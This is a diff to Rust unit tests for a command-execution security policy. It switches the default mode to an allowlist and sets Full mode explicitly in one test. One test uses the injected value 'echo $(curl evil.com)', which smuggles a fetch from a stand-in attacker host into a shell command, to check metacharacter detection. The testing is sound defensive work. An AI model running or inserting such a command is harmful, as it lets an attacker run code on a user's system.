@@ -270,7 +270,7 @@ fn test_piped_command_blocked_by_metachar() {
 #[test]
 fn test_default_policy_works() {
     let policy = ExecPolicy::default();
-    assert_eq!(policy.mode, ExecSecurityMode::Full);
+    assert_eq!(policy.mode, ExecSecurityMode::Allowlist);
     assert!(!policy.safe_bins.is_empty());
     assert!(policy.safe_bins.contains(&"echo".to_string()));
     assert!(policy.allowed_commands.is_empty());
@@ -374,7 +374,10 @@ fn test_allowlist_blocks_metachar_injection() {
 
 #[test]
 fn test_full_mode_metachar_not_checked_by_allowlist() {
-    let policy = ExecPolicy::default();
+    let policy = ExecPolicy {
+        mode: ExecSecurityMode::Full,
+        ..ExecPolicy::default()
+    };
     assert_eq!(policy.mode, ExecSecurityMode::Full);
     assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_ok());
     assert!(contains_shell_metacharacters("echo $(curl evil.com)").is_some());
